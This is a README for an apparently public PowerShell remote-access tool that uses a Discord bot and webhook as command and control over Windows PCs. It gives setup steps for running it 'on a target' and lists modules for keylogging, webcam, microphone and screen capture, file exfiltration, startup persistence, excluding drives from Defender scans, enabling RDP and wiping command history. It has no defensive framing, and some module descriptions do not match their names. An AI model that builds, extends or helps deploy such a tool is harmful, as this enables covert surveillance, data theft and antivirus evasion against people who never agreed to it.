# PoshCord-C2

**SYNOPSIS**

Using a Discord bot along with discords API and a webhook to Act as a Command and Control Platform.

**INFORMATION**

This script uses a discord bot along with discords API and a webhook to create a chat that can control a windows pc.
Every 10 seconds it will check for a new message in chat and interpret it as a custom command / module in powershell.

**Demo** (using .vbs stager and python bot)

![GIF 3-14-2024 7-18-11 PM](https://github.com/beigeworm/PoshCord-C2/assets/93350544/d1805cf3-f850-45c1-b4d2-c342cc17ecdb)

**SETUP**
1. make a discord bot at https://discord.com/developers/applications/
2. add the bot to your discord server
3. create a webhook in the desired channel on your server. ( channel-settings/integrations )
3. Change $dc below to your webhook URL eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
4. Change $tk below with your bot token
5. Change $ch below to the channel id of your webhook.

**USAGE**
1. Setup the script
2. Run the script on a target.
3. Check discord for 'waiting to connect..' message.
4. Edit the contents of your hosted file to contain 'options' to get a list of modules
5. Do the same with any other command listed - To run that module.

**MODULES**
- **SpeechToText**: Send audio transcript to Discord
- **Systeminfo**: Send System info as text file to Discord
- **FolderTree**: Save folder trees to file and send to Discord
- **EnumerateLAN**: Show devices on LAN (see ExtraInfo)
- **NearbyWifi**: Show nearby wifi networks (!user popup!)

- **AddPersistance**: Add this script to startup.
- **RemovePersistance**: Remove Poshcord from startup
- **IsAdmin**: Check if the session is admin
- **Elevate**: Attempt to restart script as admin (!user popup!)
- **ExcludeCDrive**: Exclude C:/ Drive from all Defender Scans
- **ExcludeAllDrives**: Exclude C:/ - G:/ Drives from Defender Scans
- **EnableRDP**: Enable Remote Desktop on target.
- **EnableIO**: Enable Keyboard and Mouse
- **DisableIO**: Disable Keyboard and Mouse

- **RecordAudio**: Record microphone and send to Discord
- **RecordScreen**: Record Screen and send to Discord
- **TakePicture**: Send a webcam picture and send to Discord
- **Exfiltrate**: Send various files. (see ExtraInfo)
- **Upload**: Upload a file. (see ExtraInfo)
- **Screenshot**: Sends a screenshot of the desktop and send to Discord
- **Keycapture**: Capture Keystrokes and send to Discord

- **FakeUpdate**: Spoof Windows-10 update screen using Chrome
- **Windows93**: Start parody Windows93 using Chrome
- **WindowsIdiot**: Start fake Windows95 using Chrome
- **SendHydra**: Never ending popups (use killswitch) to stop
- **SoundSpam**: Play all Windows default sounds on the target
- **Message**: Send a message window to the User (!user popup!)
- **VoiceMessage**: Send a message window to the User (!user popup!)
- **MinimizeAll**: Send a voice message to the User
- **EnableDarkMode**: Enable System wide Dark Mode
- **DisableDarkMode**: Disable System wide Dark Mode\
- **VolumeMax**: Maximise System Volume
- **VolumeMin**: Minimise System Volume
- **ShortcutBomb**: Create 50 shortcuts on the desktop.
- **Wallpaper**: Set the wallpaper (wallpaper -url http://img.com/f4wc)
- **Goose**: Spawn an annoying goose (Sam Pearson App)

- **ExtraInfo**: Get a list of further info and command examples
- **Cleanup**: Wipe history (run prompt, powershell, recycle bin, Temp)
- **Kill**: Stop a running module (eg. Keycapture / Exfiltrate)
- **Control-All**: Control all waiting sessions simultaneously
- **Pause**: Pause the current authenticated session
- **Close**: Close this session


**FEATURES**

**Custom Scripting**

You can add custom scripting / commands - Type 'YOUR CUSTOM POWERSHELL COMMAND' in chat

**Mass Control Mode**

Control all waiting sessions simultaneously with 'controll-all' to mass authenticate sessions.

**Killswitch**

Save a hosted file contents as 'kill' to stop 'KeyCapture' or 'Exfiltrate' command and return to waiting for commands.

# If you like my work please leave a star. ⭐
